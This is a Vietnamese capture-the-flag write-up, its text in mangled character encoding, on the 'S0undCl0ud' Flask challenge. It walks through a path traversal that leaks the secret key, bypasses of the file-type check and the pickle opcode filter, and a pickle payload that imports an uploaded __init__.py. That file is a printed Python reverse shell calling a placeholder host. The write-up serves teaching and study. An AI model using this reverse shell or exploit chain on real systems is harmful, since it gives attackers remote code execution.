# S0undCl0ud
## Source
File táº£i source: [source](./s0undcl0ud.zip).

## Chá»©c nÄƒng cá»§a á»©ng dá»¥ng web
á»¨ng dá»¥ng web cá»§a Ä‘á» bÃ i lÃ  má»™t má»™t á»©ng dá»¥ng cÃ³ chá»©c nÄƒng Ä‘Äƒng kÃ½/Ä‘Äƒng nháº­p.

![Oops](./images/login.jpg)

Thá»­ Ä‘Äƒng nháº­p vá»›i username vÃ  password láº§n lÆ°á»£t lÃ  `aaa` vÃ  `bbb` thÃ¬ nháº­n Ä‘Æ°á»£c thÃ´ng bÃ¡o nhÆ° sau.

![Oops](./images/username_password_regex.jpg)

NhÆ° váº­y lÃ  láº­p trÃ¬nh viÃªn cÃ³ Ã½ Ä‘á»‹nh Ä‘á»ƒ username vÃ  password thá»a mÃ£n regex `\w{4,15}`.

Thá»­ Ä‘Äƒng nháº­p láº¡i vá»›i username vÃ  password lÃ  `aaaa` vÃ  `bbbb`.

![Oops](./images/login_successfully.jpg)

Má»—i user cÃ³ thá»ƒ táº£i cÃ¡c file Ã¢m thanh lÃªn vÃ  cÃ¡c file Ä‘Ã³ sáº½ Ä‘Æ°á»£c server lÆ°u trá»¯.

![Oops](./images/login_successfully.jpg)

MÃ¬nh thá»­ táº£i má»™t file text lÃªn thÃ¬ nháº­n Ä‘Æ°á»£c nhÆ° sau

![Oops](./images/upload_failed.jpg)

NhÆ° váº­y lÃ  bÃªn phÃ­a server Ä‘Ã£ thá»±c hiá»‡n kiá»ƒm tra gÃ¬ Ä‘Ã³ Ä‘á»‘i vá»›i cÃ¡c file mÃ¬nh táº£i lÃªn.


## PhÃ¢n tÃ­ch source code
á»¨ng dá»¥ng web Ä‘Æ°á»£c triá»ƒn khai báº±ng ngÃ´n ngá»¯ láº­p trÃ¬nh Python, framework flask vÃ  há»‡ quáº£n trá»‹ cÆ¡ sá»Ÿ dá»¯ liá»‡u lÃ  sqlite.

Láº­p trÃ¬nh viÃªn sá»­ dá»¥ng `flask.session` Ä‘Æ°á»£c chá»‰nh sá»­a Ä‘á»ƒ quáº£n lÃ½ cÃ¡c session cá»§a user.

```python
import pickle
import pickletools
from flask.sessions import SecureCookieSessionInterface

_pickle_loads = pickle.loads


def loads_with_validate(data, *args, **kwargs):
    opcodes = pickletools.genops(data)

    allowed_args = ['user_id', 'musics', None]
    if not all(op[1] in allowed_args or
               type(op[1]) == int or
               type(op[1]) == str and re.match(r"^musics/[^/]+/[^/]+$", op[1])
               for op in opcodes):
        return {}

    allowed_ops = ['PROTO', 'FRAME', 'MEMOIZE', 'MARK', 'STOP',
                   'EMPTY_DICT', 'EMPTY_LIST', 'SHORT_BINUNICODE', 'BININT1',
                   'APPEND', 'APPENDS', 'SETITEM', 'SETITEMS']
    if not all(op[0].name in allowed_ops for op in opcodes):
        return {}

    return _pickle_loads(data, *args, **kwargs)


pickle.loads = loads_with_validate


class SessionInterface(SecureCookieSessionInterface):
    serializer = pickle


app = Flask(__name__)
app.secret_key = '___SECRET_KEY___'
app.session_interface = SessionInterface()
```

Viá»‡c chá»‰nh sá»­a cÃ³ má»™t chi tiáº¿t quan trá»ng lÃ  thay Ä‘á»•i thuá»™c tÃ­nh `serializer` thÃ nh `pickle`. Vá» serialize vÃ  `pickle` má»i ngÆ°á»i cÃ³ thá»ƒ xem á»Ÿ [Ä‘Ã¢y](https://www.youtube.com/watch?v=jwzeJU_62IQ).

`pickle` lÃ  má»™t serializer cÃ³ thá»ƒ chá»©a code Ä‘Æ°á»£c thá»±c thi khi deserialize. NÃªn khi deserialize ráº¥t nguy hiá»ƒm. Do Ä‘Ã³ láº­p trÃ¬nh viÃªn trÆ°á»›c khi deserialize Ä‘Ã£ filter nhÆ° hÃ m `loads_with_validate`.

TrÆ°á»›c khi phÃ¢n tÃ­ch hÃ m `loads_with_validate`, mÃ¬nh nghÄ© cÃ¡c báº¡n nÃªn há»c cÃ¡ch mÃ  pickle (de)serialize. MÃ¬nh cÃ³ má»™t bÃ i viáº¿t á»Ÿ [Ä‘Ã¢y](../../../techniques/pickle_and_problem) nÃ¨ :v.

Ã Ä‘á»‹nh filter cá»§a láº­p trÃ¬nh viÃªn:
- Má»i argument cá»§a opcode cáº§n thuá»™c `allowed_args` hoáº·c pháº£i lÃ  kiá»ƒu int hoáº·c lÃ  kiá»ƒu string nhÆ°ng thá»a mÃ£n regex `^musics/[^/]+/[^/]+$`.
    ```python
    allowed_args = ['user_id', 'musics', None]
    if not all(op[1] in allowed_args or
            type(op[1]) == int or
            type(op[1]) == str and re.match(r"^musics/[^/]+/[^/]+$", op[1])
            for op in opcodes):
        return {}
    ```
- Lá»‡nh cá»§a opcode pháº£i thuá»™c `allowed_ops`.
    ```python
    allowed_ops = ['PROTO', 'FRAME', 'MEMOIZE', 'MARK', 'STOP',
                   'EMPTY_DICT', 'EMPTY_LIST', 'SHORT_BINUNICODE', 'BININT1',
                   'APPEND', 'APPENDS', 'SETITEM', 'SETITEMS']
    if not all(op[0].name in allowed_ops for op in opcodes):
        return {}
    ```
- Khi bypass Ä‘Æ°á»£c cáº£ hai thá»© trÃªn thÃ¬ má»›i Ä‘Æ°á»£c deserialize.

Sau pháº§n session lÃ  pháº§n cá»§a database. Láº­p trÃ¬nh viÃªn setup má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u vá»›i báº£ng `users` vá»›i cÃ¡c trÆ°á»ng `id`, `username` vÃ  `password`.

Tiáº¿p theo ta sáº½ phÃ¢n tÃ­ch cÃ¡c endpoint.

Endpoint `GET /` cho ta biáº¿t lÃ  trong session sáº½ quáº£n lÃ½ `user_id` vÃ  `musics`. Cá»¥ thá»ƒ lÃ m gÃ¬ thÃ¬ cáº§n pháº£i Ä‘á»c tiáº¿p má»›i biáº¿t Ä‘Æ°á»£c :v
```python
@app.get("/")
def home():
    if 'user_id' not in session:
        return redirect("/login")

    return render_template('index.html', musics=session.get('musics'))
```

Endpoint `GET /login` thÃ¬ khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t tráº£ vá» trang `login.html`.

Endpoint `POST /login` thÃ¬ sáº½ lÃ  nÆ¡i xá»­ lÃ½ `username` vÃ  `password` do user gá»­i.
```python
@app.post("/login")
def do_login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    if not re.match(r"\w{4,15}", username) or not re.match(r"\w{4,15}", password):
        return "Username or password doesn't match \w{4,15}"

    cursor = db().cursor()
    query = "SELECT id, username, password FROM users WHERE username=?"
    res = cursor.execute(query, (username,)).fetchone()
    if res == None:
        # register
        query = "INSERT INTO users (username, password) VALUES (?, ?)"
        user_id = cursor.execute(query, (username, password,)).lastrowid
        db().commit()
        os.mkdir(safe_join("musics", username))
        session["user_id"] = user_id
        session["musics"] = []
        return redirect("/")
    elif res['password'] == password:
        # login
        musics = list(map(attrgetter('path'),
                          os.scandir(safe_join("musics", username))))
        session["user_id"] = res['id']
        session["musics"] = musics
        return redirect("/")
    else:
        return "Wrong password!"
```
á» Ä‘Ã¢y `username` vÃ  `password` Ä‘Æ°á»£c kiá»ƒm tra lÃ  pháº£i thá»a mÃ£n regex `\w{4,15}`. Náº¿u lÃ  user má»›i thÃ¬ sáº½ Ä‘Æ°á»£c lÆ°u thÃ´ng tin vÃ  cÆ¡ sá»Ÿ dá»¯ liá»‡u vÃ  Ä‘Æ°á»£c táº¡o má»™t thÆ° má»¥c riÃªng trong `musics`. File Ä‘Æ°á»£c upload cá»§a user nÃ y sáº½ á»Ÿ trong thÆ° má»¥c riÃªng Ä‘Ã³.

MÃ¬nh nghÄ© á»Ÿ Ä‘Ã¢y láº­p trÃ¬nh viÃªn cÃ³ Ã½ Ä‘á»‹nh chá»‰ cho phÃ©p regex nhÆ° nÃ y `^\w{4,15}$` nhÆ°ng do vÃ´ Ã½ nÃªn ta cÃ³ thá»ƒ Ä‘á»ƒ `username` lÃ  `aaaa/../` mÃ  váº«n bypass Ä‘Æ°á»£c regex `\w{4,15}`. NÃªn sáº½ cÃ³ lá»— há»•ng path traversal á»Ÿ Ä‘Ã¢y. LÃºc Ä‘Ã³ thÆ° má»¥c riÃªng cá»§a `aaaa/../` sáº½ lÃ  `musics` luÃ´n.

Má»—i session sáº½ quáº£n lÃ½ `user_id` lÃ  id cá»§a user vÃ  `musics` lÃ  list chá»©a danh sÃ¡ch cÃ¡c Ä‘Æ°á»ng dáº«n tá»›i cÃ¡c file trong thÆ° má»¥c riÃªng cá»§a user Ä‘Ã³.

Endpoint `POST /upload` thÃ¬ sáº½ lÃ  nÆ¡i xá»­ lÃ½ file Ã¢m thÃ nh user táº£i lÃªn.
```python
@app.post("/upload")
def upload():
    if 'user_id' not in session:
        return redirect("/login")

    cursor = db().cursor()
    query = "SELECT username FROM users WHERE id=?"
    user_id = session['user_id']
    username = cursor.execute(query, (user_id,)).fetchone()['username']
    file = request.files.get('file')
    if mimetypes.guess_type(file.filename)[0] in AUDIO_MIMETYPES and \
            magic.from_buffer(file.stream.read(), mime=True) in AUDIO_MIMETYPES:
        file.stream.seek(0)
        filename = safe_join("musics", username, file.filename)
        file.save(filename)
        if filename not in session['musics']:
            session['musics'] = session['musics'] + [filename]
        return redirect("/")

    return "Invalid file type!"
```
TrÆ°á»›c Ä‘Ã³, ta cÃ³
```
>>> import mimetypes                                                                                                    >>>                                                                                                                     >>> AUDIO_MIMETYPES = set(filter(lambda mime: mime.startswith('audio/'),                                                ...                              mimetypes.types_map.values()))                                                         >>> AUDIO_MIMETYPES                                                                                                     {'audio/x-ms-wma', 'audio/basic', 'audio/x-wav', 'audio/csound', 'audio/x-sd2', 'audio/x-ms-wax', 'audio/ogg', 'audio/prs.sid', 'audio/x-gsm', 'audio/mpeg', 'audio/amr', 'audio/x-scpls', 'audio/flac', 'audio/amr-wb', 'audio/x-mpegurl', 'audio/x-aiff', 'audio/x-realaudio', 'audio/x-pn-realaudio', 'audio/annodex', 'audio/midi'}
```

Sau Ä‘Ã³ á»Ÿ `POST /upload` file táº£i lÃªn sáº½ Ä‘Æ°á»£c kiá»ƒm tra lÃ  `mimetypes.guess_type(file.filename)[0] in AUDIO_MIMETYPES and magic.from_buffer(file.stream.read(), mime=True) in AUDIO_MIMETYPES`. Tá»©c lÃ  sáº½ dá»±a vÃ o filename cá»§a file Ä‘Æ°á»£c táº£i lÃªn vÃ  magic byte Ä‘á»ƒ Ä‘oÃ¡n filetype. Náº¿u filetype thuá»™c `AUDIO_MIMETYPES` thÃ¬ sáº½ cho phÃ©p lÆ°u vÃ o thÆ° má»¥c riÃªng cá»§a user vÃ  cáº­p nháº­t `session`.

Endpoint `GET /@<username>/<file>`:
```python
@app.get("/@<username>/<file>")
def music(username, file):
    return send_from_directory(f"musics/{username}", file, mimetype="application/octet-stream")
```
Endpoint nÃ y Ä‘Æ°á»£c táº¡o ra Ä‘á»ƒ gá»­i file Ã¢m thanh khi biáº¿t `username` vÃ  `file` (gá»­i vá» file `musics/{username}/{file}`). Tuy nhiÃªn á»Ÿ Ä‘Ã¢y cÃ³ lá»—i path traversal, ta thay `username` báº±ng `..` vÃ  `file` thÃ nh `app.py` thÃ¬ sáº½ láº¥y Ä‘Æ°á»£c source code bao gá»“m cáº£ `SECRET_KEY`. 
Khi Ä‘Ã£ cÃ³ Ä‘Æ°á»£c `SECRET_KEY` attacker cÃ³ thá»ƒ sá»­a cookie theo Ã½ muá»‘n.
![Oops](./images/get_secret_key.jpg)

## PhÃ¢n tÃ­ch solution
ToÃ n bá»™ code exploit: [exploit.py](./exploit.py).

Sau khi phÃ¢n tÃ­ch háº¿t source code mÃ¬nh váº«n khÃ´ng biáº¿t khai thÃ¡c sao cáº£, táº¡i vÃ¬ flag náº±m á»Ÿ `/` nÃªn pháº£i RCE, mÃ  thá»© duy nháº¥t cÃ³ kháº£ nÄƒng RCE lÃ  pickle mÃ  mÃ¬nh khÃ´ng sao bypass Ä‘Æ°á»£c Ä‘oáº¡n filter opcode Ä‘Ã³ cáº£. Do Ä‘Ã³ mÃ¬nh sáº½ phÃ¢n tÃ­ch solution cá»§a ban tá»• chá»©c.

Má»™t Ä‘iá»u máº¥u chá»‘t mÃ  mÃ¬nh bá» qua chÃ­nh lÃ  `pickletools.genops(data)` sáº½ tráº£ vá» generator. Khi sá»­ dá»¥ng `for in` Ä‘á»‘i vá»›i generator 2 láº§n thÃ¬ láº§n sau khÃ´ng cÃ³ tÃ¡c dá»¥ng gÃ¬ cáº£. Do Ä‘Ã³ á»Ÿ pháº§n filter opcode pickle thÃ¬ chá»‰ cÃ³ cÃ¡i Ä‘áº§u tiÃªn cÃ³ tÃ¡c dá»¥ng. NÃªn hÃ m `loads_with_validate` sáº½ cÃ³ tÃ¡c dá»¥ng duy nháº¥t lÃ  kiá»ƒm tra má»i argument cá»§a opcode cáº§n thuá»™c `allowed_args` (`['user_id', 'musics', None]`) hoáº·c pháº£i lÃ  kiá»ƒu int hoáº·c lÃ  kiá»ƒu string nhÆ°ng thá»a mÃ£n regex `^musics/[^/]+/[^/]+$`. CÃ²n lá»‡nh cá»§a opcode thÃ¬ lÃ  gÃ¬ cÅ©ng Ä‘Æ°á»£c.
```
>>> import pickletools
>>>
>>> opcode = pickletools.genops(b'Vmusics\n2\x93.')
>>> for x in opcode:
...     print(x[0].name, x[1])
...
UNICODE musics
DUP None
STACK_GLOBAL None
STOP None
>>>
>>> for x in opcode:            # khÃ´ng cÃ³ Ã½ nghÄ©a 
...     print(x[0].name, x[1]) 
...
>>>
```

Ã tÆ°á»Ÿng cá»§a tÃ¡c giáº£ sáº½ lÃ  upload file `__init__.py` vÃ o thÆ° má»¥c `musics` rá»“i lá»£i dá»¥ng lá»‡nh `STACK_GLOBAL` trong pickle machine Ä‘á»ƒ import `musics` tá»« Ä‘Ã³ sáº½ thá»±c thi code trong `__init__.py`. CÃ¡ch lá»£i dá»¥ng nhÆ° trong [bÃ i viáº¿t](../../../techniques/pickle_and_problem), chá»‰ khÃ¡c lÃ  láº§n nÃ y tÃ¡c giáº£ sá»­ dá»¥ng `STACK_GLOBAL` thay cho `GLOBAL` nhÆ° trong bÃ i viáº¿t. Chuá»—i opcode mÃ  ta muá»‘n deserialize sáº½ nhÆ° sau `Vmusics\n2\x93.`.
```
>>> import pickletools
>>>
>>> opcode = pickletools.genops(b'Vmusics\n2\x93.')
>>> for x in opcode:
...     print(x[0].name, x[1])
...
UNICODE musics
DUP None
STACK_GLOBAL None
STOP None
```

Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c `SECRET_KEY` vÃ  cÃ³ Ä‘Æ°á»£c chuá»—i opcode Ä‘á»ƒ RCE, giá» ta cáº§n tÃ¬m cÃ¡ch upload `__init__.py` ná»¯a lÃ  xong.

Ta sáº½ dÃ¹ng username dáº¡ng `aaaa/../` Ä‘á»ƒ cÃ³ thá»ƒ upload vÃ o `musics`, bÃ¢y giá» ta chá»‰ cáº§n bypass Ä‘oáº¡n check file type ná»¯a lÃ  xong.

HÃ m `guess_type()` nháº­n argument lÃ  má»™t url chá»© khÃ´ng pháº£i lÃ  má»™t file name.
![Oops](./images/guess_type.jpg)

NÃªn cÃ³ thá»ƒ sá»­ dá»¥ng `data:audio/x-wav,` Ä‘á»ƒ bypass. HÃ m Ä‘Ã³ sáº½ check scheme vÃ  type trÆ°á»›c khi check filename. VÃ­ dá»¥: `data:audio/x-wav,/test.py` sáº½ Ä‘Æ°á»£c Ä‘oÃ¡n file type lÃ  `audio/x-wav` cÃ²n `test.py` sáº½ Ä‘Æ°á»£c Ä‘oÃ¡n file type lÃ  `text/x-python` .Má»i ngÆ°á»i Ä‘á»c thÃªm á»Ÿ [Ä‘Ã¢y](https://github.com/python/cpython/blob/main/Lib/mimetypes.py#L103) nhÃ© ğŸ˜‰

Hoáº·c cÃ³ thá»ƒ sá»­ dá»¥ng null byte Ä‘á»ƒ bypass:
![Oops](./images/nullbytetrick.jpg)

CÃ²n bypass check thá»© hai thÃ¬ sá»­ dá»¥ng magicbyte cá»§a `audio/x-wav` (`RIFFxxxxWAVEfmt`) á»Ÿ Ä‘áº§u file lÃ  bypass Ä‘Æ°á»£c.

LÃºc Ä‘Ã³ file type Ä‘Æ°á»£c dá»± Ä‘oÃ¡n Ä‘á»u lÃ  `audio/x-wav`. Do Ä‘Ã³ sáº½ bypass Ä‘Æ°á»£c.

Káº¿t há»£p háº¿t nhá»¯ng thá»© á»Ÿ trÃªn láº¡i. Trong file exploit cá»§a tÃ¡c giáº£, quy trÃ¬nh nhÆ° sau:

0. Setup chuáº©n bá»‹ cho reverse shell.
1. Láº¥y `SECRET_KEY`.
2. Login vá»›i username lÃ  `data:audio` -> táº¡o thÆ° má»¥c `musics/data:audio`.
3. Login vá»›i username lÃ  `data:audio/x-wav,` -> táº¡o thÆ° má»¥c `musics/data:audio/x-wav,`.
4. Login vá»›i username lÃ  `nyan` -> táº¡o thÆ° má»¥c `musics/nyan`.
5. Login vá»›i `nyan/../` -> táº¡o thÆ° má»¥c `musics/nyan/../`hay `musics`, vÃ¬ `musics` Ä‘Ã£ tá»“n táº¡i nÃªn sáº½ cÃ³ lá»—i á»Ÿ bÆ°á»›c nÃ y, tuy nhiÃªn cÆ¡ sá»Ÿ dá»¯ liá»‡u Ä‘Æ°á»£c lÆ°u trÆ°á»›c khi cÃ³ lá»—i nÃªn tÃ i khoáº£n `nyan/..` váº«n cÃ²n.
6. Sá»­ dá»¥ng tÃ i khoáº£n `nyan/../` Ä‘á»ƒ gá»­i file vá»›i filename lÃ  `data:audio/x-wav,/../../__init__.py` -> lÆ°u file `musics/data:audio/x-wav,/../../__init__.py` chá»‰nh lÃ  `musics/__init__.py`. Filename cÃ³ `data:audio/x-wav` vÃ  trong `__init__.py` cÃ³ chá»©a magic byte cá»§a `data:audio/x-wav` nÃªn sáº½ bypass Ä‘Æ°á»£c Ä‘oáº¡n check khi upload file.
    ```py
    # file __init__.py

    RIFFxxxxWAVEfmt = 1337  # file signature for `audio/x-wav`
    import socket, subprocess, os
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("HOOK", 2808))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/bash", "-i"])
    ```
7. Sá»­ dá»¥ng `SECRET_KEY` gá»­i `b'Vmusics\n2\x93.'` lÃªn Ä‘á»ƒ import `musics` vÃ  RCE.

## Nhá»¯ng thá»© há»c Ä‘Æ°á»£c
TrÆ°á»›c giá» mÃ¬nh váº«n tháº¯c máº¯c cÃ¡ch hoáº¡t Ä‘á»™ng cá»§a pickle, sau bÃ i nÃ y thÃ¬ mÃ¬nh Ä‘Ã£ há»c Ä‘Æ°á»£c Ä‘iá»u Ä‘Ã³. NgoÃ i ra mÃ¬nh cÃ²n biáº¿t vá» generator ná»¯a. ğŸ™‚